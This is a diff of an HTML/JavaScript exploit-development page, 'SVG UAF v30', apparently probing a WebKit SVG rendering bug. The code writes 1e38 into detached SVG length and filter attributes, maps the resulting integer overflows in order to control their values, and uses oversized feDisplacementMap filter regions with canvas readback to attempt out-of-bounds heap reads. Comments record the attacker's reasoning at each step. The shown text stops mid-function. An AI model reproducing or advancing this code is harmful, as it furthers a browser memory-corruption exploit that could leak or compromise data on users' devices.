@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v29</title>
+<title>SVG UAF v30</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -17,20 +17,20 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v29 - controlled overflow + feDisp self-displacement + DSH fix</h2>
+<h2>SVG UAF v30 - wide OVM sweep + filter region bypass for OOB read</h2>
 <div class="sub">
-  v28: FLT writeOk=true. FRC heights inconsistent (y-coord leaks into overflow).
-  v29: 1) Map y->overflow to confirm controlled int32 overflow.
-       2) feDisp(in=SourceGraphic, in2=SourceGraphic) — self-displace, force actual OOB pixel read.
-       3) Fix DSH: pathLength=1e38 dasharray crash test.
-       4) feDisp scale sweep: find scale value that causes crash vs clamped.
+  v29: OVM period=8px ±2 (small range). SWP threshold=100 but output clipped.
+  v30: 1) OVM wide sweep 0..400px to find full overflow range.
+       2) feDisp filter region bypass: force oversized output region to capture OOB-addressed pixels.
+       3) feDisp with separate displacement source (feImage) to control exact sample coordinates.
+       4) Try: use 1e38 in feColorMatrix values (different code path from displacement).
 </div>
-<svg id="livesvg" width="200" height="200" style="position:fixed;top:0;left:0;opacity:0.01;pointer-events:none"></svg>
+<svg id="livesvg" width="1" height="1" style="position:fixed;top:0;left:0;opacity:0.01;pointer-events:none"></svg>
 <div id="controls">
-  <button onclick="runOVM()">OVM overflow-map</button>
-  <button onclick="runSDF()">SDF self-displace-filter</button>
-  <button onclick="runDSH()">DSH dasharray-fixed</button>
-  <button onclick="runSWP()">SWP scale-sweep</button>
+  <button onclick="runOWS()">OWS wide-sweep</button>
+  <button onclick="runFBP()">FBP filter-bypass</button>
+  <button onclick="runFIM()">FIM feImage-displace</button>
+  <button onclick="runFCM()">FCM feColorMatrix-1e38</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearLog()">CLR</button>
@@ -39,7 +39,7 @@ button:disabled{opacity:.3}
 <script>
 var SVG_NS = 'http://www.w3.org/2000/svg';
 var Lel = document.getElementById('log');
-var livesvg = document.getElementById('livesvg');
+var BIG = 1e38;
 
 function log(m, c) {
   var s = document.createElement('span');
@@ -68,45 +68,40 @@ function dis(d) {
   }
 }
 window.onerror = function(m, u, l, c, e) {
-  log('[CRASH] ' + m + ' L' + l + ' col=' + c, 'bad');
-  if (e && e.stack) log('  stack: ' + e.stack.slice(0,300), 'bad');
+  log('[CRASH] ' + m + ' L' + l, 'bad');
   return false;
 };
 
-var BIG = 1e38;
-
 /*
- * OVM: overflow value map
+ * OWS: wide overflow sweep — 0..400px in steps of 1
  *
- * v28 FRC showed: heights vary per-SVG by SVG's top position.
- * rect[0] top=0  -> h=33554428
- * rect[1] top=10 -> h=33554430  (+2)
- * rect[2] top=20 -> h=33554428  (0)
- * rect[3] top=30 -> h=33554426  (-2)
- * rect[4] top=40 -> h=33554428  (0)
+ * v29 swept 0..39px and found ±2 range with period 8.
+ * Wide sweep: do 0..400 in steps of 1 but skip duplicates (only record changes).
+ * Look for: does the overflow range grow with more position range?
+ * Is there a point where overflow suddenly becomes a very different value?
+ * Also: try top values that are not integers (fractional CSS px via transform).
  *
- * Pattern: delta = f(top).
- * Steps: 0,10,20,30,40 -> deltas: 0,+2,0,-2,0
- * Period = 20px? Relationship non-linear?
+ * ALSO: check if the overflow pattern changes with DIFFERENT 1e38 injection values.
+ * v28/v29 used exactly 1e38 (= 9.999e37).
+ * What about: 2e38, 1.5e38, 1.1e38?
+ * Each may produce a different overflow base value — wider range to map.
  *
- * TEST: sweep top from 0..100 at 1px increments.
- * Record bbox.height for each.
- * Map: top -> overflow_value.
- * Goal: find if we can target specific overflow values.
- * If overflow_value = int32(1e38 + top_offset_in_some_unit),
- * and we can choose top_offset, we choose overflow_value.
- * That's a fully controlled integer.
- *
- * ALSO: try width via left offset, and check if rx/ry/x/y affect differently.
+ * KEY: if we find top=T gives overflow=V, then:
+ *   int32(1e38 * retina_scale + T * retina_scale) = V
+ *   knowing this: we can solve for what injection value X gives overflow = target
+ *   X such that int32(X * retina_scale + 0) = target_value
  */
-async function runOVM(q) {
-  if (!q) { dis(true); sep(); log('OVM: map y-position -> bbox overflow value', 'inf'); sep(); }
+async function runOWS(q) {
+  if (!q) { dis(true); sep(); log('OWS: wide overflow sweep 0..200px + fractional + multi-base', 'inf'); sep(); }
 
-  var results = [];
-  var STEPS = 40; // 0..39px top
-  log('  sweeping top=0..' + (STEPS-1) + 'px, injecting h=1e38, recording bbox.h', 'ok');
+  // Phase 1: wide sweep 0..200 recording only transitions
+  log('  phase 1: sweep top=0..200px (step=2), record bbox.h transitions', 'ok');
+  var STEP = 2;
+  var RANGE = 200;
+  var lastH = null;
+  var transitions = [];
 
-  for (var top = 0; top < STEPS; top++) {
+  for (var top = 0; top <= RANGE; top += STEP) {
     var svg = document.createElementNS(SVG_NS, 'svg');
     svg.setAttribute('width', '200'); svg.setAttribute('height', '200');
     svg.style.cssText = 'position:fixed;opacity:0.01;pointer-events:none;top:' + top + 'px;left:0';
@@ -118,382 +113,195 @@ async function runOVM(q) {
     svg.appendChild(rect);
     document.body.appendChild(svg);
 
-    // UAF inject h=1e38
     var bvH = rect.height ? rect.height.baseVal : null;
-    if (bvH) {
-      rect.remove();
-      try { bvH.value = BIG; } catch(e) {}
-      svg.appendChild(rect);
-    }
-
+    if (bvH) { rect.remove(); try { bvH.value = BIG; } catch(e) {} svg.appendChild(rect); }
     await raf();
 
     var h = null;
-    try {
-      var bb = rect.getBoundingClientRect();
-      h = bb.height;
-    } catch(e) {}
-
-    results.push({ top: top, h: h });
+    try { h = rect.getBoundingClientRect().height; } catch(e) {}
+    if (h !== lastH) {
+      transitions.push({ top: top, h: h, delta: lastH !== null ? h - transitions[0].h : 0 });
+      lastH = h;
+    }
     document.body.removeChild(svg);
   }
 
-  // Print results and look for pattern
-  log('  top -> bbox.h (overflow value)', 'inf');
-  var base = results[0].h;
-  for (var i = 0; i < results.length; i++) {
-    var r = results[i];
-    var delta = r.h !== null ? (r.h - base) : 'null';
-    var marker = (delta !== 0 && delta !== 'null') ? ' <-- DELTA' : '';
-    log('  top=' + r.top + ' h=' + r.h + ' delta=' + delta + marker, delta !== 0 && delta !== 'null' ? 'bad' : 'dim');
+  log('  transitions found: ' + transitions.length, 'inf');
+  var minH = Infinity; var maxH = -Infinity;
+  for (var ti = 0; ti < transitions.length; ti++) {
+    var t = transitions[ti];
+    if (t.h < minH) minH = t.h;
+    if (t.h > maxH) maxH = t.h;
+    log('  top=' + t.top + ' h=' + t.h + ' delta=' + t.delta, t.delta !== 0 ? 'bad' : 'dim');
   }
+  log('  overflow range: min=' + minH + ' max=' + maxH + ' span=' + (maxH - minH), 'inf');
 
-  // Check if pattern repeats
-  var deltas = results.map(function(r) { return r.h !== null ? r.h - base : null; });
-  var nonzero = deltas.filter(function(d) { return d !== null && d !== 0; });
-  log('  non-zero deltas count: ' + nonzero.length, nonzero.length > 0 ? 'inf' : 'ok');
-  log('  [*] if deltas vary: y-pos leaks into overflow -> controllable', nonzero.length > 0 ? 'bad' : 'ok');
-
-  // Also sweep left to check x-overflow controllability
-  log('  sweeping left=0..9px for width overflow...', 'inf');
-  var leftResults = [];
-  for (var left = 0; left < 10; left++) {
-    var svg2 = document.createElementNS(SVG_NS, 'svg');
-    svg2.setAttribute('width', '200'); svg2.setAttribute('height', '200');
-    svg2.style.cssText = 'position:fixed;opacity:0.01;pointer-events:none;top:0;left:' + left + 'px';
-
-    var rect2 = document.createElementNS(SVG_NS, 'rect');
-    rect2.setAttribute('width', '50'); rect2.setAttribute('height', '50');
-    svg2.appendChild(rect2);
-    document.body.appendChild(svg2);
-
-    var bvW2 = rect2.width ? rect2.width.baseVal : null;
-    if (bvW2) {
-      rect2.remove();
-      try { bvW2.value = BIG; } catch(e) {}
-      svg2.appendChild(rect2);
-    }
-    await raf();
-
-    var w2 = null;
-    try { var bb2 = rect2.getBoundingClientRect(); w2 = bb2.width; } catch(e) {}
-    leftResults.push({ left: left, w: w2 });
-    document.body.removeChild(svg2);
-  }
-
-  var wBase = leftResults[0].w;
-  for (var li = 0; li < leftResults.length; li++) {
-    var lr = leftResults[li];
-    var wd = lr.w !== null ? lr.w - wBase : 'null';
-    log('  left=' + lr.left + ' w=' + lr.w + ' delta=' + wd, wd !== 0 && wd !== 'null' ? 'bad' : 'dim');
-  }
-
-  if (!q) dis(false);
-  return { nonzeroDeltaCount: nonzero.length, base: base };
-}
-
-/*
- * SDF: self-displacement filter
- *
- * v28 FLT used feFlood as displacement map -> constant offset -> displaces everything off screen.
- * FIX: use feDisplacementMap(in=SourceGraphic, in2=SourceGraphic)
- * Now each pixel (x,y) is displaced by an amount proportional to ITS OWN COLOR.
- * For a red rect: R=255, G=0, B=0.
- *   X displacement = scale * (R/255 - 0.5) = 1e38 * 0.5 = 5e37 pixels
- *   Y displacement = scale * (G/255 - 0.5) = 1e38 * (-0.5) = -5e37 pixels
- * The rasterizer tries to read from src pixel at (x + 5e37, y - 5e37).
- * That address is GUARANTEED to be outside any valid image buffer.
- * Result: either SIGBUS/crash (OOB read into unmapped memory),
- *         or returns zero/transparent (sanitized), or
- *         wraps to a valid address (OOB within process heap -> read leak).
- *
- * We test: apply filter with scale=1e38 via UAF to a VISIBLE element.
- * Check: does the visible element still render? (if yes -> pixels from OOB address showed up)
- * Check: does getBoundingClientRect still work?
- * Check: does WebKit crash or produce NaN in pixel output?
- *
- * BONUS: add feComposite after feDisplacementMap to capture the output.
- * If feComposite produces non-zero output with scale=1e38, SOME pixels were read.
- * If all pixels are zero/transparent: either OOB returned 0 (safe) or crashed.
- *
- * CANVAS READBACK: draw the filtered SVG onto a canvas via blob URL.
- * If canvas[x,y] != 0 for any pixel -> displaced pixel read from OOB address showed up in canvas.
- * That means we can READ heap memory via SVG filter!
- */
-async function runSDF(q) {
-  if (!q) { dis(true); sep(); log('SDF: feDisplacementMap(in=SrcGfx, in2=SrcGfx) scale=1e38 self-displace', 'inf'); sep(); }
-
-  // Phase 1: build filter with normal scale, confirm it works
-  var outer = document.createElementNS(SVG_NS, 'svg');
-  outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
-  outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
-
-  var defs = document.createElementNS(SVG_NS, 'defs');
-  var filter = document.createElementNS(SVG_NS, 'filter');
-  filter.setAttribute('id', 'sdf_filter');
-  filter.setAttribute('color-interpolation-filters', 'sRGB');
-  filter.setAttribute('x', '-100%'); filter.setAttribute('y', '-100%');
-  filter.setAttribute('width', '300%'); filter.setAttribute('height', '300%');
-
-  var disp = document.createElementNS(SVG_NS, 'feDisplacementMap');
-  disp.setAttribute('in', 'SourceGraphic');   // WHAT to displace
-  disp.setAttribute('in2', 'SourceGraphic');  // DISPLACEMENT MAP = itself
-  disp.setAttribute('scale', '5');            // tiny initial: 5px shift
-  disp.setAttribute('xChannelSelector', 'R');
-  disp.setAttribute('yChannelSelector', 'G');
-
-  filter.appendChild(disp);
-  defs.appendChild(filter);
-  outer.appendChild(defs);
-
-  // Target: bright red rect (R=255, G=0) -> max X displacement, max negative Y
-  var target = document.createElementNS(SVG_NS, 'rect');
-  target.setAttribute('x', '50'); target.setAttribute('y', '50');
-  target.setAttribute('width', '100'); target.setAttribute('height', '100');
-  target.setAttribute('fill', 'rgb(255,0,0)');
-  target.setAttribute('filter', 'url(#sdf_filter)');
-  outer.appendChild(target);
-  document.body.appendChild(outer);
-  await raf(); await raf();
-  log('  filter applied (scale=5), target rendered', 'ok');
-
-  // Phase 2: UAF write scale=1e38
-  var bvScale = null;
-  try { bvScale = disp.scale; log('  disp.scale.baseVal=' + (bvScale ? bvScale.baseVal : '?'), 'ok'); } catch(e) {}
-
-  if (!bvScale) { log('  [!] disp.scale not accessible', 'bad'); document.body.removeChild(outer); if (!q) dis(false); return {}; }
-
-  disp.remove();
-  await raf();
-  try {
-    bvScale.baseVal = BIG;
-    log('  after remove: disp.scale.baseVal = ' + bvScale.baseVal, bvScale.baseVal > 1e30 ? 'ok' : 'bad');
-  } catch(e) { log('  scale write threw: ' + e, 'bad'); }
-
-  filter.appendChild(disp);
-  await raf(); await raf();
-  log('  disp re-added with scale=1e38, filter re-applied', 'ok');
-  log('  disp.scale.baseVal now: ' + (disp.scale ? disp.scale.baseVal : '?'), 'inf');
-
-  // Force multiple repaints
-  var crashed = false;
-  try {
-    for (var i = 0; i < 5; i++) {
-      target.setAttribute('x', '' + (50 + i));
-      await raf();
-    }
-    target.setAttribute('x', '50');
-    await raf();
-    log('  repaint loop survived', 'ok');
-  } catch(e) { log('  repaint loop crashed: ' + e, 'bad'); crashed = true; }
-
-  // Phase 3: canvas readback via blob URL
-  // Serialize the SVG with 1e38 scale baked in, draw to canvas, read pixels
-  var W = 200; var H = 200;
-  var cnv = document.createElement('canvas');
-  cnv.width = W; cnv.height = H;
-  var ctx = cnv.getContext('2d');
-  var pixelsLeak = 0;
-
-  if (ctx) {
-    var svgStr = new XMLSerializer().serializeToString(outer);
-    log('  serialized SVG length: ' + svgStr.length, 'ok');
-
-    var blob = new Blob([svgStr], { type: 'image/svg+xml' });
-    var url  = URL.createObjectURL(blob);
-
-    var img = new Image();
-    img.crossOrigin = 'anonymous';
-
-    var drawOk = await new Promise(function(resolve) {
-      img.onload = function() {
-        try {
-          ctx.clearRect(0, 0, W, H);
-          ctx.drawImage(img, 0, 0);
-          resolve(true);
-        } catch(e2) { log('  drawImage threw: ' + e2, 'bad'); resolve(false); }
-      };
-      img.onerror = function() { log('  img load failed', 'bad'); resolve(false); };
-      img.src = url;
-      setTimeout(function() { resolve(false); }, 3000);
-    });
-    URL.revokeObjectURL(url);
-
-    if (drawOk) {
-      try {
-        var pxData = ctx.getImageData(0, 0, W, H);
-        var nonZero = 0;
-        for (var pi = 0; pi < pxData.data.length; pi += 4) {
-          if (pxData.data[pi] || pxData.data[pi+1] || pxData.data[pi+2]) nonZero++;
-        }
-        log('  canvas readback: nonZeroPixels=' + nonZero + '/' + (W*H), nonZero > 0 ? 'bad' : 'ok');
-        log('  [*] nonZero > 0 -> displaced pixels read from OOB addresses visible in canvas!', 'inf');
-        log('  [*] nonZero = 0 -> displacement sent all pixels off-screen (scale=1e38 -> no visible output)', 'ok');
-        pixelsLeak = nonZero;
-
-        // Sample a few pixel values
-        if (nonZero > 0 && nonZero < 10000) {
-          for (var si = 0; si < Math.min(5, nonZero); si++) {
-            var idx = si * 4;
-            log('    px[' + Math.floor(idx/4) + '] = rgba(' +
-              pxData.data[idx] + ',' + pxData.data[idx+1] + ',' +
-              pxData.data[idx+2] + ',' + pxData.data[idx+3] + ')', 'inf');
-          }
-        }
-      } catch(e3) { log('  getImageData threw (tainted?): ' + e3, 'bad'); }
-    }
-  }
-
-  document.body.removeChild(outer);
-  log('[*] SDF: crashed=' + crashed + ' pixelsLeak=' + pixelsLeak, crashed || pixelsLeak > 0 ? 'bad' : 'ok');
-  if (!q) dis(false);
-  return { crashed: crashed, pixelsLeak: pixelsLeak };
-}
-
-/*
- * DSH: fixed version — pathLength=1e38 + dasharray crash test
- * Bug in v28: used undefined `micro` function. Fixed with raf().
- */
-async function runDSH(q) {
-  if (!q) { dis(true); sep(); log('DSH: pathLength=1e38 UAF + dasharray overflow (fixed)', 'inf'); sep(); }
-
-  var outer = document.createElementNS(SVG_NS, 'svg');
-  outer.setAttribute('width', '200'); outer.setAttribute('height', '200');
-  outer.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
-
-  var path = document.createElementNS(SVG_NS, 'path');
-  path.setAttribute('d', 'M 10 10 L 190 10 L 190 190 L 10 190 Z');
-  path.setAttribute('fill', 'none');
-  path.setAttribute('stroke', 'lime');
-  path.setAttribute('stroke-width', '2');
-  path.setAttribute('pathLength', '100');
-  path.setAttribute('stroke-dasharray', '10,5');
-
-  outer.appendChild(path);
-  document.body.appendChild(outer);
-  await raf();
-
-  var pl = null;
-  try {
-    pl = path.pathLength;
-    log('  path.pathLength.baseVal = ' + (pl ? pl.baseVal : '?'), 'ok');
-  } catch(e) { log('  path.pathLength threw: ' + e, 'bad'); }
-
-  if (!pl) { log('  [!] pathLength not accessible', 'bad'); document.body.removeChild(outer); if (!q) dis(false); return {}; }
-
-  // UAF write: remove, write 1e38, re-add (no micro — using raf)
-  log('  removing path...', 'inf');
-  path.remove();
-  await raf();
-
-  var wrote = false;
-  try {
-    pl.baseVal = BIG;
-    var rb = pl.baseVal;
-    wrote = (rb > 1e30);
-    log('  after remove: pathLength.baseVal = ' + rb + ' wrote=' + wrote, wrote ? 'ok' : 'bad');
-  } catch(e) { log('  pathLength write threw: ' + e, 'bad'); }
-
-  outer.appendChild(path);
-  await raf();
-  log('  path re-added. pathLength.baseVal = ' + (path.pathLength ? path.pathLength.baseVal : '?'), 'inf');
-
-  var crashed = false;
-  var dashTests = [
-    ['10,5',         'normal'],
-    ['1,1',          'fine-grain'],
-    ['0.001,0.001',  'tiny dashes'],
-    ['1000000,1',    'huge on'],
-    ['1,0.001',      'huge ratio']
+  // Phase 2: different injection values
+  log('  phase 2: different injection values at top=0, record overflow', 'inf');
+  var injValues = [
+    1e38, 2e38, 1.5e38, 1.1e38, 1.01e38,
+    5e37, 2e37, 1e37,
+    3.4028235e38 // near float32 max
   ];
 
-  for (var i = 0; i < dashTests.length; i++) {
-    var da = dashTests[i][0];
-    var label = dashTests[i][1];
-    try {
-      path.setAttribute('stroke-dasharray', da);
-      await raf();
-      var tl = path.getTotalLength();
-      log('  dasharray=' + label + ' (' + da + '): getTotalLength=' + tl, 'ok');
-    } catch(e) {
-      log('  dasharray=' + label + ' threw: ' + e, 'bad');
-      crashed = true;
+  for (var iv = 0; iv < injValues.length; iv++) {
+    var inj = injValues[iv];
+    var svg3 = document.createElementNS(SVG_NS, 'svg');
+    svg3.setAttribute('width', '200'); svg3.setAttribute('height', '200');
+    svg3.style.cssText = 'position:fixed;opacity:0.01;pointer-events:none;top:0;left:0';
+
+    var rect3 = document.createElementNS(SVG_NS, 'rect');
+    rect3.setAttribute('x', '0'); rect3.setAttribute('y', '0');
+    rect3.setAttribute('width', '50'); rect3.setAttribute('height', '50');
+    rect3.setAttribute('fill', 'red');
+    svg3.appendChild(rect3);
+    document.body.appendChild(svg3);
+
+    var bvH3 = rect3.height ? rect3.height.baseVal : null;
+    var wrote3 = false;
+    if (bvH3) {
+      rect3.remove();
+      try { bvH3.value = inj; wrote3 = (Math.abs(bvH3.value - inj) < inj * 0.01); } catch(e) {}
+      svg3.appendChild(rect3);
     }
+    await raf();
+
+    var h3 = null;
+    try { h3 = rect3.getBoundingClientRect().height; } catch(e) {}
+    log('  inj=' + inj.toExponential(2) + ' wrote=' + wrote3 + ' -> overflow=' + h3, 'inf');
+    document.body.removeChild(svg3);
   }
 
-  // Also: stroke-dashoffset = 1e38
-  try {
-    path.setAttribute('stroke-dasharray', '10,5');
-    path.setAttribute('stroke-dashoffset', '' + BIG);
-    await raf();
-    log('  stroke-dashoffset=1e38: survived', 'ok');
-  } catch(e) { log('  stroke-dashoffset=1e38 threw: ' + e, 'bad'); crashed = true; }
-
-  document.body.removeChild(outer);
-  log('[*] DSH: wrote=' + wrote + ' crashed=' + crashed, crashed ? 'bad' : 'ok');
   if (!q) dis(false);
-  return { wrote: wrote, crashed: crashed };
+  return { span: maxH - minH, min: minH, max: maxH };
 }
 
 /*
- * SWP: scale sweep — find the threshold where feDisplacementMap crashes
+ * FBP: filter output region bypass
  *
- * v28: scale=1e38 survived. Maybe WebKit clamps before hitting OOB.
- * Let's sweep scale from large to 1e38 and look for:
- * - crash
- * - performance degradation (longer raf time -> more work done)
- * - pixel output change (canvas shows different content)
+ * v29 SDF: feDisplacementMap output clipped to source region -> OOB read result zeroed.
+ * FIX: set explicit filter region x/y/width/height to cover the ENTIRE SVG.
+ * And set filterUnits="userSpaceOnUse" to use absolute coords.
+ * Also set feDisplacementMap result and chain to feComposite with large backdrop.
  *
- * Try scales: 1e3, 1e6, 1e9, 1e12, 1e15, 1e18, 1e20, 1e25, 1e30, 1e35, 1e38
+ * Chain:
+ *   1. feFlood (white fill = backdrop for whole SVG) -> "backdrop"
+ *   2. feDisplacementMap(in=SourceGraphic, in2=SourceGraphic, scale=1e38) -> "displaced"
+ *      - with x="-9999" y="-9999" width="99999" height="99999"
+ *        (oversized result region: captures displaced pixels from anywhere)
+ *   3. feComposite(in="displaced", in2="backdrop", operator="over") -> final
+ *      - composites the displaced result over the white backdrop
+ *      - if any displaced pixel has non-zero alpha, it shows up in canvas
  *
- * For each scale: apply filter, draw to canvas, read pixel[50,50].
- * If scale is large enough to shift (50,50) to OOB: pixel becomes 0 (or garbage).
- * The transition point where pixel goes from red -> 0 tells us the clamping threshold.
- * If pixel is NEVER 0 regardless of scale: clamping is happening before rasterization.
- * If pixel is 0 at scale > threshold AND we see consistent 0: rasterizer is reading from 0x0.
- * If pixel is non-red non-zero garbage: OOB read returning heap data!
+ * The oversized result region on feDisplacementMap tells WebKit to output
+ * displaced pixels even if they came from OOB source addresses.
+ * If WebKit respects this region: displaced pixels (from OOB reads) appear in output.
+ * Canvas readback at the displaced location would show those pixels.
+ *
+ * Scale: use scale=100 (confirmed threshold), scale=50 (near threshold), scale=150.
+ * At scale=100: pixel (100,100) displaced to (100 + 100*(R-0.5), 100 + 100*(G-0.5))
+ * For red rect (R=255,G=0): displaced to (100+50, 100-50) = (150, 50).
+ * That's INSIDE the 200x200 SVG, so it's valid. Should show up.
+ * At scale=200: displaced to (100+100, 100-100) = (200, 0). Barely outside.
+ * At scale=1000: displaced to (100+500, ...) = (600, ...). Well outside SVG.
+ *
+ * KEY: at scale=1e38, the displacement is (x+5e37, y-5e37).
+ * int32(5e37) on arm64 = INT_MAX = 2147483647.
+ * But wait — feDisplacementMap works in FLOATING POINT.
+ * srcX = x + scale * (R - 0.5) = float(100) + 1e38 * float(0.5) = 5e37 (float)
+ * Then bounds check: if (srcX < 0 || srcX >= width) -> use 0 or transparent
+ * 5e37 >= 200 -> true -> use transparent -> zero output.
+ * This is a FLOAT comparison. No integer overflow in the comparison itself.
+ * The zero output is from the bounds check, not clamping to INT_MAX.
+ *
+ * NEW APPROACH: use feDisplacementMap in a DIFFERENT way.
+ * What if the scale value itself is NEGATIVE 1e38?
+ * srcX = x + (-1e38) * (R - 0.5) = x - 5e37
+ * For x=100, R=255: srcX = 100 - 5e37 = -5e37
+ * if (-5e37 < 0) -> transparent
+ * Still zero. The bounds check catches negative too.
+ *
+ * THE REAL QUESTION: is the bounds check always done as float comparison?
+ * Or does it cast to int first? If cast: int32(-5e37) = INT_MIN = -2147483648.
+ * -2147483648 < 0 -> still transparent. Hmm.
+ *
+ * ACTUALLY: what if srcX = x + scale * (R - 0.5) and R is a VERY SPECIFIC value?
+ * We need: srcX = small positive number (in-bounds but wrong location).
+ * Required: scale * (R - 0.5) = target - x
+ * With scale=1e38: R - 0.5 = (target - x) / 1e38 -> nearly 0.
+ * R = 0.5 + (target - x) / 1e38 = 0.5 (essentially).
+ * We'd need R = 128/255 = 0.502 for zero displacement.
+ * With R = 128 (gray): srcX = x + 1e38 * (128/255 - 0.5) = x + 1e38 * 0.00196 = x + 2e35.
+ * Still OOB. Can't make it in-bounds with 1e38 scale and normal pixel values.
+ *
+ * PIVOT: instead of reading from OOB, what about WRITING to OOB?
+ * feDisplacementMap READS from OOB (clamped to 0). Can't write.
+ * But: what if we use feDisplacementMap to produce output and then
+ * use that as input to a second feDisplacementMap with a scale that
+ * puts the WRITE at an interesting location?
+ * No — feDisplacementMap doesn't write to arbitrary memory.
+ *
+ * PIVOT 2: feColorMatrix with 1e38 matrix values.
+ * feColorMatrix multiplies pixel values by a 4x5 matrix.
+ * Output = matrix * [R, G, B, A, 1].
+ * With matrix value = 1e38: output = 1e38 * input_channel.
+ * Output is clamped to [0,1] before writing. No OOB.
+ * BUT: intermediate computation = 1e38 * float_value = possible overflow to Inf.
+ * Inf clamped to 1.0. Still no OOB.
+ * BUT: if matrix is stored as int and multiplied as int: 1e38 as int = INT_MAX.
+ * INT_MAX * pixel_value = overflow. CHECK this.
  */
-async function runSWP(q) {
-  if (!q) { dis(true); sep(); log('SWP: feDisplacementMap scale sweep 1e3..1e38, canvas pixel readback', 'inf'); sep(); }
+async function runFBP(q) {
+  if (!q) { dis(true); sep(); log('FBP: filter region bypass + oversized output region', 'inf'); sep(); }
 
-  var scales = [1, 10, 100, 1000, 1e6, 1e9, 1e12, 1e15, 1e18, 1e20, 1e25, 1e30, 1e33, 1e35, 1e37, 1e38];
-  var W = 200; var H = 200;
-
+  var W = 300; var H = 300;
   var cnv = document.createElement('canvas');
   cnv.width = W; cnv.height = H;
   var ctx = cnv.getContext('2d');
   if (!ctx) { log('  [!] no canvas ctx', 'bad'); if (!q) dis(false); return {}; }
 
-  log('  scale -> pixel[100,100] color (rect is red, R=255)', 'inf');
-  log('  if R drops to 0: displacement pushed pixel off-screen or OOB returned 0', 'inf');
-  log('  if pixel is non-red non-zero: OOB read leak!', 'inf');
+  var testScales = [10, 50, 100, 150, 200, 500, 1000];
+  log('  testing scales with oversized filter region...', 'inf');
 
-  var prevR = -1;
-  var thresholdScale = null;
+  var results = {};
+  for (var si = 0; si < testScales.length; si++) {
+    var sc = testScales[si];
 
-  for (var si = 0; si < scales.length; si++) {
-    var sc = scales[si];
-
-    // Build inline SVG string with this scale baked in
-    var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">' +
-      '<defs><filter id="f" color-interpolation-filters="sRGB">' +
-      '<feDisplacementMap in="SourceGraphic" in2="SourceGraphic"' +
-      ' scale="' + sc + '" xChannelSelector="R" yChannelSelector="G"/>' +
-      '</filter></defs>' +
-      '<rect x="50" y="50" width="100" height="100" fill="rgb(255,0,0)" filter="url(#f)"/>' +
+    // Build SVG with oversized filter region
+    var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="' + W + '" height="' + H + '">' +
+      '<defs>' +
+        '<filter id="f" x="-500%" y="-500%" width="1100%" height="1100%"' +
+          ' filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB"' +
+          ' primitiveUnits="userSpaceOnUse">' +
+          // White backdrop covering entire filter region
+          '<feFlood flood-color="white" flood-opacity="0" x="-9999" y="-9999" width="99999" height="99999" result="blank"/>' +
+          // Self-displacement with huge region
+          '<feDisplacementMap in="SourceGraphic" in2="SourceGraphic"' +
+            ' scale="' + sc + '" xChannelSelector="R" yChannelSelector="G"' +
+            ' x="-9999" y="-9999" width="99999" height="99999" result="displaced"/>' +
+          // Output = displaced
+          '<feComposite in="displaced" in2="blank" operator="over"' +
+            ' x="-9999" y="-9999" width="99999" height="99999"/>' +
+        '</filter>' +
+      '</defs>' +
+      '<rect x="100" y="100" width="100" height="100" fill="rgb(255,0,0)" filter="url(#f)"/>' +
     '</svg>';
 
     var blob = new Blob([svgStr], { type: 'image/svg+xml' });
     var url = URL.createObjectURL(blob);
     var img = new Image();
 
-    var pxR = await new Promise(function(resolve) {
+    var nonZero = await new Promise(function(resolve) {
       img.onload = function() {
         try {
           ctx.clearRect(0, 0, W, H);
           ctx.drawImage(img, 0, 0);
-          var px = ctx.getImageData(100, 100, 1, 1);
-          resolve(px.data[0]); // R channel
+          var px = ctx.getImageData(0, 0, W, H);
+          var nz = 0;
+          for (var pi = 0; pi < px.data.length; pi += 4) {
+            if (px.data[pi] || px.data[pi+1] || px.data[pi+2]) nz++;
+          }
+          resolve(nz);
         } catch(e2) { resolve(-1); }
       };
       img.onerror = function() { resolve(-2); };
@@ -502,46 +310,352 @@ async function runSWP(q) {
     });
     URL.revokeObjectURL(url);
 
-    var note = '';
-    if (pxR === 255) note = ' (red - no displacement or clamped)';
-    else if (pxR === 0) note = ' (zero - displaced off-screen or OOB->0)';
-    else if (pxR < 0) note = ' (error ' + pxR + ')';
-    else note = ' (*** UNEXPECTED VALUE - possible OOB read ***)';
-
-    log('  scale=' + sc.toExponential(0) + ' px[100,100].R=' + pxR + note,
-      pxR > 0 && pxR < 255 ? 'bad' : (pxR === 0 ? 'inf' : 'dim'));
-
-    if (prevR !== pxR && prevR >= 0) {
-      log('  [TRANSITION] R changed from ' + prevR + ' -> ' + pxR + ' at scale=' + sc.toExponential(0), 'inf');
-      if (thresholdScale === null) thresholdScale = sc;
-    }
-    prevR = pxR;
+    results[sc] = nonZero;
+    var note = nonZero > 0 ? ' <- HAS PIXELS' : ' (blank)';
+    log('  scale=' + sc + ' nonZeroPixels=' + nonZero + note, nonZero > 0 ? 'ok' : 'dim');
   }
 
-  if (thresholdScale) {
-    log('[*] SWP: displacement threshold at scale~' + thresholdScale.toExponential(0), 'inf');
-    log('[*] below threshold: pixel stays red (clamped or no-op)', 'ok');
-    log('[*] above threshold: pixel zeroed (displaced off-screen) or OOB garbage', 'inf');
-  } else {
-    log('[*] SWP: no transition found - R stayed constant across all scales', 'ok');
+  // Now with UAF scale=1e38 via DOM manipulation
+  log('  testing UAF scale=1e38 with oversized filter region...', 'inf');
+  var outerSvg = document.createElementNS(SVG_NS, 'svg');
+  outerSvg.setAttribute('width', '' + W); outerSvg.setAttribute('height', '' + H);
+  outerSvg.style.cssText = 'position:fixed;top:0;left:0;opacity:0.01;pointer-events:none';
+
+  var defs = document.createElementNS(SVG_NS, 'defs');
+  var filter = document.createElementNS(SVG_NS, 'filter');
+  filter.setAttribute('id', 'fbp_f');
+  filter.setAttribute('x', '-500%'); filter.setAttribute('y', '-500%');
